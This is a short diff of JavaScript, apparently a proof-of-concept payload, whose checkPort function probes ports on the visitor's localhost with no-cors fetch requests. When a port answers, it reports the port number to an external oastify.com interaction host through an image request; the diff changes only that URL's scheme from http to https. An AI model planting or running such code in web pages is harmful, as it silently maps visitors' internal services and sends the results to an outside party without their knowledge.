@@ -3,7 +3,7 @@
     const checkPort = (port) => {
     fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
         let img = document.createElement("img");
-        img.src = `http://3018ell9d5hpaa5pn4zq601u1l7cv3js.oastify.com/ping?port=${port}`;
+        img.src = `https://3018ell9d5hpaa5pn4zq601u1l7cv3js.oastify.com/ping?port=${port}`;
     });
 }
 
